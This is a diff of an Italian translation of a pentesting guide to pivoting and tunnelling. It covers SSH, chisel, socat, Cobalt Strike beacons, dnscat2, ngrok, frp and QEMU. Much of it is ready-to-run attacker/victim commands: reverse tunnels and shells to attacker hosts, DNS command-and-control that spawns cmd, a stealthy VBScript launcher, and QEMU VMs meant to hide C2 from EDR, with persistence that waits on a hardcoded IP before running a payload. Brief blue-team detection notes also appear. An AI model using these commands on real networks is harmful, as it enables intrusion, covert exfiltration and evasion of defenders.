@@ -5,7 +5,7 @@
 ## Suggerimento Nmap
 
 > [!WARNING]
-> **ICMP** e **SYN** scans non possono essere tunnelled attraverso socks proxies, quindi dobbiamo **disable ping discovery** (`-Pn`) e specificare **TCP scans** (`-sT`) per far sì che funzioni.
+> **ICMP** e **SYN** scans non possono essere tunnelled attraverso socks proxies, quindi dobbiamo **disable ping discovery** (`-Pn`) e specificare **TCP scans** (`-sT`) affinché questo funzioni.
 
 ## **Bash**
 
@@ -27,13 +27,13 @@ evil-winrm -u username -i Jump
 ```
 ## **SSH**
 
-Connessione grafica SSH (X)
+SSH connessione grafica (X)
 ```bash
 ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
 ```
 ### Local Port2Port
 
-Apri una nuova Port sul SSH Server --> altra Port
+Aprire una nuova Port nel SSH Server --> altra Port
 ```bash
 ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
 ```
@@ -68,7 +68,7 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 ```
 ### VPN-Tunnel
 
-Hai bisogno di **root su entrambi i dispositivi** (dato che creerai nuove interfacce) e la configurazione di sshd deve permettere il login di root:\
+Hai bisogno di **root su entrambi i dispositivi** (poiché creerai nuove interfacce) e la configurazione di sshd deve permettere il login di root:\
 `PermitRootLogin yes`\
 `PermitTunnel yes`
 ```bash
@@ -89,12 +89,12 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 > [!NOTE]
 > **Sicurezza – Terrapin Attack (CVE-2023-48795)**
-> Il Terrapin downgrade attack del 2023 può permettere a un man-in-the-middle di manomettere la handshake SSH iniziale e iniettare dati in **qualsiasi canale inoltrato** (`-L`, `-R`, `-D`). Assicurati che sia client che server siano patchati (**OpenSSH ≥ 9.6/LibreSSH 6.7**) oppure disabilita esplicitamente gli algoritmi vulnerabili `chacha20-poly1305@openssh.com` e `*-etm@openssh.com` in `sshd_config`/`ssh_config` prima di fare affidamento su SSH tunnels.
+> L'attacco di downgrade Terrapin del 2023 può permettere a un man-in-the-middle di manomettere l'handshake SSH iniziale e iniettare dati in **qualsiasi canale inoltrato** ( `-L`, `-R`, `-D` ). Assicurarsi che sia client sia server siano patchati (**OpenSSH ≥ 9.6/LibreSSH 6.7**) o disabilitare esplicitamente gli algoritmi vulnerabili `chacha20-poly1305@openssh.com` e `*-etm@openssh.com` in `sshd_config`/`ssh_config` prima di affidarsi ai tunnel SSH.
 
 ## SSHUTTLE
 
-Puoi **tunnelare** via **ssh** tutto il **traffico** verso una **sottorete** attraverso un host.\
-Per esempio, inoltrando tutto il traffico destinato a 10.10.10.0/24
+Puoi **tunnelare** via **ssh** tutto il **traffico** verso una **sottorete** tramite un host.\
+Ad esempio, inoltrare tutto il traffico diretto a 10.10.10.0/24
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
@@ -108,7 +108,7 @@ sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 
 ### Port2Port
 
-Port locale --> Host compromesso (sessione attiva) --> Third_box:Port
+Port locale --> host compromesso (session attiva) --> Third_box:Port
 ```bash
 # Inside a meterpreter session
 portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
@@ -138,7 +138,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS proxy
 
-Apri una porta sul teamserver che ascolti su tutte le interfacce e che possa essere usata per **instradare il traffico attraverso il beacon**.
+Apri un port sul teamserver in ascolto su tutte le interfaces che possa essere usato per **route the traffic through the beacon**.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -149,37 +149,37 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 > [!WARNING]
-> In questo caso, la **porta viene aperta nel beacon host**, non nel Team Server e il traffico viene inviato al Team Server e da lì all'host:port indicato.
+> In questo caso, la **port viene aperta nel beacon host**, non nel Team Server e il traffico viene inviato al Team Server e da lì verso l'host:port indicato
 ```bash
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
 ```
 Da notare:
 
-- Beacon's reverse port forward è progettato per **tunnel traffic to the Team Server, not for relaying between individual machines**.
-- Il traffico è **tunneled within Beacon's C2 traffic**, inclusi P2P links.
-- **Admin privileges are not required** per creare reverse port forwards su high ports.
+- Beacon's reverse port forward è progettato per **tunnelare il traffico verso il Team Server, non per inoltrare tra singole macchine**.
+- Il traffico è **tunnelato all'interno del traffico C2 di Beacon**, inclusi i link P2P.
+- **Admin privileges are not required** per creare reverse port forwards su porte elevate.
 
 ### rPort2Port local
 
 > [!WARNING]
-> In questo caso, la **port is opened in the beacon host**, non nel Team Server, e il **traffic is sent to the Cobalt Strike client** (non nel Team Server) e da lì verso l'host:port indicato
+> In questo caso, la **porta viene aperta nel beacon host**, non nel Team Server e il **traffico viene inviato al Cobalt Strike client** (non al Team Server) e da lì all'host:port indicato
 ```bash
 rportfwd_local [bind port] [forward host] [forward port]
 rportfwd_local stop [bind port]
 ```
 ## reGeorg
 
-[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeOrg)
+[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)
 
-Devi caricare un file tunnel web: ashx|aspx|js|jsp|php|php|jsp
+Devi caricare un file web per il tunnel: ashx|aspx|js|jsp|php|php|jsp
 ```bash
 python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
 ```
 ## Chisel
 
-Puoi scaricarlo dalla pagina releases di [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
-Devi usare **la stessa versione per client e server**
+Puoi scaricarlo dalla pagina delle release di [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
+È necessario usare la **stessa versione per client e server**
 
 ### socks
 ```bash
@@ -190,7 +190,7 @@ Devi usare **la stessa versione per client e server**
 ./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
 ./chisel client -v 10.10.10.10:8080 socks #Attacker
 ```
-### Inoltro porte
+### Port forwarding
 ```bash
 ./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
 ./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
@@ -223,7 +223,7 @@ interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_age
 # Display the tun interfaces -- Attacker
 interface_list
 ```
-### Binding e ascolto dell'Agent
+### Associazione e ascolto dell'agente
 ```bash
 # Establish a tunnel from the proxy server to the agent
 # Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
@@ -242,7 +242,7 @@ interface_add_route --name "ligolo" --route 240.0.0.1/32
 [https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)
 
 Reverse tunnel. Il tunnel viene avviato dalla vittima.\
-Viene creato un socks4 proxy su 127.0.0.1:1080
+Un socks4 proxy viene creato su 127.0.0.1:1080
 ```bash
 attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
 ```
@@ -250,7 +250,7 @@ attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
 ```
-Pivot attraverso **NTLM proxy**
+Pivot tramite **NTLM proxy**
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
 ```
@@ -296,11 +296,11 @@ OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacke
 ```
 [https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)
 
-### Tunnel SSL con Socat
+### SSL Socat Tunnel
 
 **/bin/sh console**
 
-Creare i certificati su entrambi i lati: Client e Server
+Creare certificati su entrambe le estremità: Client e Server
 ```bash
 # Execute these commands on both sides
 FILENAME=socatssl
@@ -316,7 +316,7 @@ victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.
 ```
 ### Remote Port2Port
 
-Connetti la porta SSH locale (22) alla porta 443 dell'attacker host
+Collega la porta SSH locale (22) alla porta 443 dell'attacker host
 ```bash
 attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
 victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
@@ -326,7 +326,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 È come una versione console di PuTTY (le opzioni sono molto simili a quelle di un ssh client).
 
-Poiché questo binary verrà eseguito sulla vittima ed è un ssh client, dobbiamo aprire il nostro servizio ssh e la porta in modo da poter avere una reverse connection. Poi, per forwardare solo una porta accessibile localmente verso una porta sulla nostra macchina:
+Poiché questo binary verrà eseguito nella victim ed è un ssh client, dobbiamo aprire il nostro ssh service e la porta in modo da poter avere una reverse connection. Poi, per forwardare solo una porta accessibile localmente verso una porta sulla nostra macchina:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -335,7 +335,7 @@ echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0
 
 ### Port2Port
 
-È necessario essere local admin (per qualsiasi porta)
+Devi essere amministratore locale (per qualsiasi porta)
 ```bash
 netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
 # Example:
@@ -347,10 +347,10 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ```
 ## SocksOverRDP & Proxifier
 
-Devi avere **accesso RDP sul sistema**.\
+Devi avere **accesso RDP al sistema**.\
 Scarica:
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Questo tool utilizza `Dynamic Virtual Channels` (`DVC`) della funzionalità Remote Desktop Service di Windows. DVC è responsabile del **tunneling dei pacchetti sulla connessione RDP**.
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Questo strumento utilizza `Dynamic Virtual Channels` (`DVC`) della funzionalità Remote Desktop Service di Windows. DVC è responsabile del **tunneling dei pacchetti sulla connessione RDP**.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
 Sul tuo computer client carica **`SocksOverRDP-Plugin.dll`** in questo modo:
@@ -358,9 +358,9 @@ Sul tuo computer client carica **`SocksOverRDP-Plugin.dll`** in questo modo:
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Ora possiamo **connetterci** alla **victim** tramite **RDP** usando **`mstsc.exe`**, e dovremmo ricevere un **prompt** che indica che il **SocksOverRDP plugin è abilitato**, e che **ascolterà** su **127.0.0.1:1080**.
+Ora possiamo **connect** al **victim** tramite **RDP** usando **`mstsc.exe`**, e dovremmo ricevere un **prompt** che indica che il **SocksOverRDP plugin is enabled**, e che farà **listen** su **127.0.0.1:1080**.
 
-**Connettiti** via **RDP** e carica & esegui sulla macchina **victim** il binario `SocksOverRDP-Server.exe`:
+**Connect** via **RDP** and upload & execute in the **victim** machine the `SocksOverRDP-Server.exe` binary:
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
@@ -368,17 +368,17 @@ Ora, conferma sulla tua macchina (attacker) che la porta 1080 sia in ascolto:
 ```
 netstat -antb | findstr 1080
 ```
-Ora puoi usare [**Proxifier**](https://www.proxifier.com/) **per instradare il traffico tramite proxy attraverso quella porta.**
+Now you can use [**Proxifier**](https://www.proxifier.com/) **per instradare il traffico attraverso quella porta tramite proxy.**
 
-## Proxify app GUI di Windows
+## Proxify le app GUI di Windows
 
-Puoi far sì che le app GUI di Windows navighino tramite un proxy usando [**Proxifier**](https://www.proxifier.com/).\
+You can make Windows GUI apps navigate through a proxy using [**Proxifier**](https://www.proxifier.com/).\
 In **Profile -> Proxy Servers** aggiungi l'IP e la porta del server SOCKS.\
-In **Profile -> Proxification Rules** aggiungi il nome del programma da instradare tramite proxy e le connessioni verso gli IP che vuoi instradare.
+In **Profile -> Proxification Rules** aggiungi il nome del programma da inviare tramite proxy e le connessioni verso gli IP che vuoi inviare tramite proxy.
 
 ## NTLM proxy bypass
 
-Lo strumento menzionato in precedenza: **Rpivot**\
+Lo strumento menzionato precedentemente: **Rpivot**\
 **OpenVPN** può anche aggirarlo, impostando queste opzioni nel file di configurazione:
 ```bash
 http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
@@ -387,8 +387,8 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Si autentica contro un proxy e apre una port locale che viene inoltrata al servizio esterno che specifichi. Poi puoi usare lo strumento che preferisci attraverso questa port.\
-Ad esempio, inoltra la port 443
+Si autentica contro un proxy e apre una porta localmente che viene inoltrata al servizio esterno che specifichi. Poi puoi usare lo strumento che preferisci tramite questa porta.\
+Ad esempio, inoltra la porta 443
 ```
 Username Alice
 Password P@ssw0rd
@@ -396,11 +396,12 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Now, if you set for example in the victim the **SSH** service to listen in port 443. You can connect to it through the attacker port 2222.\ You could also use a **meterpreter** that connects to localhost:443 and the attacker is listening in port 2222.
+Ora, se imposti ad esempio nel victim il servizio **SSH** per ascoltare sulla porta 443, puoi connetterti ad esso attraverso la porta 2222 dell'attacker.\
+Puoi anche usare un **meterpreter** che si connette a localhost:443 mentre l'attacker è in ascolto sulla porta 2222.
 
 ## YARP
 
-Un proxy inverso creato da Microsoft. Puoi trovarlo qui: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)
+Un reverse proxy creato da Microsoft. Puoi trovarlo qui: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)
 
 ## DNS Tunneling
 
@@ -408,7 +409,7 @@ Un proxy inverso creato da Microsoft. Puoi trovarlo qui: [https://github.com/mic
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-Root è necessario in entrambi i sistemi per creare tun adapters e trasferire dati tra di essi usando DNS queries.
+Root è necessario in entrambi i sistemi per creare tun adapters e tunnel data tra di essi usando DNS queries.
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
@@ -422,7 +423,7 @@ ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 
 [**Download it from here**](https://github.com/iagox86/dnscat2)**.**
 
-Stabilisce un canale C\&C tramite DNS. Non necessita di root privileges.
+Stabilisce un canale C\&C tramite DNS. Non richiede privilegi root.
 ```bash
 attacker> ruby ./dnscat2.rb tunneldomain.com
 victim> ./dnscat2 tunneldomain.com
@@ -433,56 +434,56 @@ victim> ./dnscat2 --dns host=10.10.10.10,port=5353
 ```
 #### **In PowerShell**
 
-Puoi usare [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) per eseguire un dnscat2 client in powershell:
+Puoi usare [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) per eseguire un client dnscat2 in PowerShell:
 ```
 Import-Module .\dnscat2.ps1
 Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
 ```
-#### **Port forwarding con dnscat**
+#### **Port forwarding with dnscat**
 ```bash
 session -i <sessions_id>
 listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
 ```
-#### Cambia DNS di proxychains
+#### Modificare il DNS di proxychains
 
-Proxychains intercetta la chiamata libc `gethostbyname` e inoltra le richieste DNS TCP attraverso il proxy SOCKS. Per **default** il server **DNS** che proxychains usa è **4.2.2.2** (hardcoded). Per cambiarlo, modifica il file: _/usr/lib/proxychains3/proxyresolv_ e cambia l'IP. Se ti trovi in un **Windows environment** puoi impostare l'IP del **domain controller**.
+Proxychains intercetta la chiamata libc `gethostbyname` e incanala le richieste DNS tcp attraverso il socks proxy. Di **default** il server **DNS** che usa proxychains è **4.2.2.2** (hardcoded). Per cambiarlo, modifica il file: _/usr/lib/proxychains3/proxyresolv_ e cambia l'IP. Se sei in un **ambiente Windows** puoi impostare l'IP del **domain controller**.
 
-## Tunnels in Go
+## Tunnel in Go
 
 [https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)
 
-### C2 DNS TXT/HTTP JSON personalizzato (AK47C2)
+### DNS TXT personalizzato / HTTP JSON C2 (AK47C2)
 
-L'attore Storm-2603 ha creato un **C2 a doppio canale ("AK47C2")** che sfrutta *soltanto* il traffico in uscita **DNS** e **plain HTTP POST** – due protocolli raramente bloccati nelle reti aziendali.
+L'attore Storm-2603 ha creato un **C2 a doppio canale ("AK47C2")** che sfrutta *solo* il traffico in uscita **DNS** e **plain HTTP POST** – due protocolli che raramente sono bloccati nelle reti aziendali.
 
-1. **Modalità DNS (AK47DNS)**
-• Genera un SessionID casuale di 5 caratteri (e.g. `H4T14`).
-• Preappone `1` per le *task requests* o `2` per i *results* e concatena diversi campi (flags, SessionID, nome del computer).
-• Ogni campo è **XOR-encrypted with the ASCII key `VHBD@H`**, codificato in esadecimale e unito con dei punti – termina infine con il dominio controllato dall'attaccante:
+1. **DNS mode (AK47DNS)**
+• Genera un SessionID casuale di 5 caratteri (es. `H4T14`).
+• Prepone `1` per le *task requests* o `2` per i *results* e concatena diversi campi (flags, SessionID, nome del computer).
+• Ogni campo è **XOR-encrypted with the ASCII key `VHBD@H`**, hex-encoded, e unito con dei punti – terminando infine con il dominio controllato dall'attaccante:
 
 ```text
 <1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
 ```
 
-• Le richieste usano `DnsQuery()` per record **TXT** (e come fallback **MG**) .
-• Quando la risposta supera 0xFF bytes il backdoor **frammenta** i dati in pezzi da 63 byte e inserisce i marker:
-`s<SessionID>t<TOTAL>p<POS>` così il server C2 può riorganizzarli.
+• Le richieste usano `DnsQuery()` per record **TXT** (e fallback **MG**).
+• Quando la risposta supera 0xFF byte il backdoor **frammenta** i dati in pezzi da 63 byte e inserisce i marker:
+`s<SessionID>t<TOTAL>p<POS>` così il server C2 può riassemblarli.
 
-2. **Modalità HTTP (AK47HTTP)**
-• Costruisce un involucro JSON:
+2. **HTTP mode (AK47HTTP)**
+• Costruisce un envelope JSON:
 ```json
 {"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
 ```
-• L'intero blob è XOR-`VHBD@H` → hex → inviato come corpo di una **`POST /`** con header `Content-Type: text/plain`.
+• L'intero blob viene XOR-`VHBD@H` → hex → inviato come body di una **`POST /`** con header `Content-Type: text/plain`.
 • La risposta segue la stessa codifica e il campo `cmd` viene eseguito con `cmd.exe /c <command> 2>&1`.
 
-Note per il Blue Team
-• Cerca query **TXT** insolite il cui primo label è una lunga stringa esadecimale e che finiscono sempre con un dominio raro.
+Note Blue Team
+• Cerca query **TXT** insolite il cui primo label è un lungo esadecimale e che finiscono sempre su uno stesso dominio raro.
 • Una chiave XOR costante seguita da ASCII-hex è facile da rilevare con YARA: `6?56484244?484` (`VHBD@H` in hex).
-• Per HTTP, segnala i corpi di POST text/plain che sono puro esadecimale e multipli di due byte.
+• Per HTTP, segnala body di POST text/plain che sono puro esadecimale e multipli di due byte.
 
 {{#note}}
-L'intero canale rientra nelle **query conformi agli RFC standard** e mantiene ciascun label di sottodominio sotto i 63 byte, rendendolo furtivo nella maggior parte dei log DNS.
+L'intero canale rientra in **query standard compatibili RFC** e mantiene ogni label di sottodominio sotto i 63 byte, rendendolo stealth nella maggior parte dei log DNS.
 {{#endnote}}
 
 ## Tunnel ICMP
@@ -492,7 +493,7 @@ L'intero canale rientra nelle **query conformi agli RFC standard** e mantiene ci
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-È necessario root su entrambi i sistemi per creare interfacce tun e incanalare i dati tra loro usando richieste ICMP echo.
+Serve l'accesso root in entrambi i sistemi per creare interfacce tun e tunnelizzare i dati tra di essi usando richieste ICMP echo.
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -516,13 +517,13 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ```
 ## ngrok
 
-[**ngrok**](https://ngrok.com/) **è uno strumento per esporre soluzioni su Internet con un solo comando.**\
+[**ngrok**](https://ngrok.com/) **è uno strumento per esporre soluzioni a Internet con un unico comando.**\
 _Gli URI di esposizione sono del tipo:_ **UID.ngrok.io**
 
 ### Installazione
 
 - Crea un account: https://ngrok.com/signup
-- Download del client:
+- Scarica il client:
 ```bash
 tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
 chmod a+x ./ngrok
@@ -543,7 +544,7 @@ _È anche possibile aggiungere autenticazione e TLS, se necessario._
 # Listen (example): nc -nvlp 4444
 # Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
 ```
-#### Esporre file tramite HTTP
+#### Esporre file via HTTP
 ```bash
 ./ngrok http file:///tmp/httpbin/
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
@@ -565,7 +566,7 @@ Direttamente da stdout o nell'interfaccia HTTP [http://127.0.0.1:4040](http://12
 Apre 3 tunnel:
 
 - 2 TCP
-- 1 HTTP con esposizione di file statici da /tmp/httpbin/
+- 1 HTTP che espone file statici da /tmp/httpbin/
 ```yaml
 tunnels:
 mytcp:
@@ -580,9 +581,9 @@ addr: file:///tmp/httpbin/
 ```
 ## Cloudflared (Cloudflare Tunnel)
 
-Il demone `cloudflared` di Cloudflare può creare tunnel in uscita che espongono **local TCP/UDP services** senza richiedere inbound firewall rules, usando Cloudflare’s edge come punto d'incontro. Questo è molto utile quando l'egress firewall consente solo traffico HTTPS ma le connessioni in ingresso sono bloccate.
+Il daemon `cloudflared` di Cloudflare può creare tunnel in uscita che espongono **servizi TCP/UDP locali** senza richiedere regole del firewall in ingresso, usando l'edge di Cloudflare come punto d'incontro. Questo è molto utile quando il firewall in uscita permette solo traffico HTTPS ma le connessioni in ingresso sono bloccate.
 
-### One-liner rapido per tunnel
+### One-liner rapido per il tunnel
 ```bash
 # Expose a local web service listening on 8080
 cloudflared tunnel --url http://localhost:8080
@@ -607,11 +608,11 @@ Avvia il connettore:
 ```bash
 cloudflared tunnel run mytunnel
 ```
-Poiché tutto il traffico esce dall'host **outbound over 443**, i tunnel Cloudflared sono un modo semplice per bypassare le ACL di ingresso o i confini NAT. Tieni presente che il binario solitamente gira con privilegi elevati – usa container o il flag `--user` quando possibile.
+Poiché tutto il traffico esce dall'host **outbound over 443**, i tunnel Cloudflared sono un modo semplice per bypassare ingress ACLs o NAT boundaries. Tieni presente che il binary di solito gira con privilegi elevati – usa containers o il flag `--user` quando possibile.
 
 ## FRP (Fast Reverse Proxy)
 
-[`frp`](https://github.com/fatedier/frp) è un reverse-proxy Go attivamente mantenuto che supporta **TCP, UDP, HTTP/S, SOCKS and P2P NAT-hole-punching**. A partire da **v0.53.0 (May 2024)** può comportarsi come un **SSH Tunnel Gateway**, così un host target può avviare un reverse tunnel usando solo il client OpenSSH di serie – nessun binario aggiuntivo richiesto.
+[`frp`](https://github.com/fatedier/frp) è un reverse-proxy Go attivamente mantenuto che supporta **TCP, UDP, HTTP/S, SOCKS and P2P NAT-hole-punching**. A partire da **v0.53.0 (May 2024)** può agire come un **SSH Tunnel Gateway**, quindi un host target può avviare un reverse tunnel usando solo il client OpenSSH stock – nessun binary aggiuntivo richiesto.
 
 ### Classic reverse TCP tunnel
 ```bash
@@ -632,7 +633,7 @@ localIP    = "127.0.0.1"
 localPort  = 3389
 remotePort = 5000
 ```
-### Uso del nuovo SSH gateway (senza binario frpc)
+### Utilizzo del nuovo SSH gateway (senza binario frpc)
 ```bash
 # On frps (attacker)
 sshTunnelGateway.bindPort = 2200   # add to frps.toml
@@ -641,13 +642,13 @@ sshTunnelGateway.bindPort = 2200   # add to frps.toml
 # On victim (OpenSSH client only)
 ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
 ```
-Il comando sopra pubblica la porta della vittima **8080** come **attacker_ip:9000** senza distribuire strumenti aggiuntivi – ideale per living-off-the-land pivoting.
+Il comando sopra pubblica la porta della vittima **8080** come **attacker_ip:9000** senza installare tool aggiuntivi – ideale per living-off-the-land pivoting.
 
-## Tunnel nascosti basati su VM con QEMU
+## Tunnel coverti basati su VM con QEMU
 
-Il networking in user-mode di QEMU (`-netdev user`) supporta un'opzione chiamata `hostfwd` che **lega una porta TCP/UDP sul *host* e la inoltra nel *guest***. Quando il guest esegue un SSH daemon completo, la regola hostfwd ti fornisce un SSH jump box usa-e-getta che vive interamente all'interno di una VM effimera – perfetto per nascondere il traffico C2 dall'EDR perché tutta l'attività e i file maligni restano nel disco virtuale.
+QEMU’s user-mode networking (`-netdev user`) supporta un'opzione chiamata `hostfwd` che **associa una porta TCP/UDP sul *host* e la inoltra al *guest***. Quando il *guest* esegue un demone SSH completo, la regola hostfwd ti fornisce uno SSH jump box usa-e-getta che vive interamente all'interno di una VM effimera – perfetto per nascondere il traffico C2 dall'EDR perché tutte le attività e i file maligni restano nel disco virtuale.
 
-### One-liner rapido
+### Rapido one-liner
 ```powershell
 # Windows victim (no admin rights, no driver install – portable binaries only)
 qemu-system-x86_64.exe ^
@@ -657,43 +658,66 @@ qemu-system-x86_64.exe ^
 -device e1000,netdev=n0 ^
 -nographic
 ```
-• Il comando sopra avvia un'immagine di **Tiny Core Linux** (`tc.qcow2`) in RAM.
-• La porta **2222/tcp** sull'host Windows viene inoltrata in modo trasparente alla porta **22/tcp** all'interno del guest.
-• Dal punto di vista dell'attacker, il target semplicemente espone la porta 2222; tutti i pacchetti che la raggiungono sono gestiti dal server SSH in esecuzione nella VM.
+• Il comando sopra avvia un'immagine **Tiny Core Linux** (`tc.qcow2`) in RAM.
+• La porta **2222/tcp** sull'host Windows viene inoltrata in modo trasparente a **22/tcp** all'interno del guest.
+• Dal punto di vista dell'attaccante il target espone semplicemente la porta 2222; qualsiasi pacchetto che la raggiunge viene gestito dal server SSH in esecuzione nella VM.
 
-### Lancio furtivo tramite VBScript
+### Avvio furtivo tramite VBScript
 ```vb
 ' update.vbs – lived in C:\ProgramData\update
 Set o = CreateObject("Wscript.Shell")
 o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
 ```
-L'esecuzione dello script con `cscript.exe //B update.vbs` mantiene la finestra nascosta.
+Eseguire lo script con `cscript.exe //B update.vbs` mantiene la finestra nascosta.
 
-### Persistenza in guest
+### In-guest persistence
 
-Poiché Tiny Core è senza stato, gli attaccanti di solito:
+Poiché Tiny Core è senza stato, gli attacker di solito:
 
-1. Drop payload to `/opt/123.out`
-2. Append to `/opt/bootlocal.sh`:
+1. Posizionano il payload in `/opt/123.out`
+2. Aggiungono a `/opt/bootlocal.sh`:
 
 ```sh
 while ! ping -c1 45.77.4.101; do sleep 2; done
 /opt/123.out
 ```
 
-3. Add `home/tc` and `opt` to `/opt/filetool.lst` so the payload is packed into `mydata.tgz` on shutdown.
+3. Aggiungono `home/tc` e `opt` a `/opt/filetool.lst` così il payload viene inserito in `mydata.tgz` allo spegnimento.
 
-### Perché questo elude il rilevamento
+### Why this evades detection
 
-• Only two unsigned executables (`qemu-system-*.exe`) touch disk; no drivers or services are installed.  
-• I prodotti di sicurezza sull'host vedono **benign loopback traffic** (il vero C2 termina all'interno della VM).  
-• Gli scanner di memoria non analizzano mai lo spazio dei processi malevoli perché si trova in un OS diverso.
+• Solo due eseguibili non firmati (`qemu-system-*.exe`) toccano il disco; non vengono installati driver o servizi.  
+• I prodotti di sicurezza sull'host vedono **benign loopback traffic** (la reale C2 termina all'interno della VM).  
+• I memory scanners non analizzano mai lo spazio dei processi malevoli perché risiede in un OS diverso.
 
-### Suggerimenti per i difensori
+### Defender tips
 
-• Segnala la presenza di **unexpected QEMU/VirtualBox/KVM binaries** in percorsi scrivibili dagli utenti.  
-• Blocca le connessioni in uscita originate da `qemu-system*.exe`.  
-• Cerca porte di ascolto rare (2222, 10022, …) che vengono aperte immediatamente dopo l'avvio di QEMU.
+• Generare alert su **unexpected QEMU/VirtualBox/KVM binaries** in percorsi scrivibili dagli utenti.  
+• Bloccare le connessioni in uscita che originano da `qemu-system*.exe`.  
+• Cercare porte in ascolto rare (2222, 10022, …) che si legano immediatamente dopo il lancio di QEMU.
+
+## IIS/HTTP.sys relay nodes via `HttpAddUrl` (ShadowPad)
+
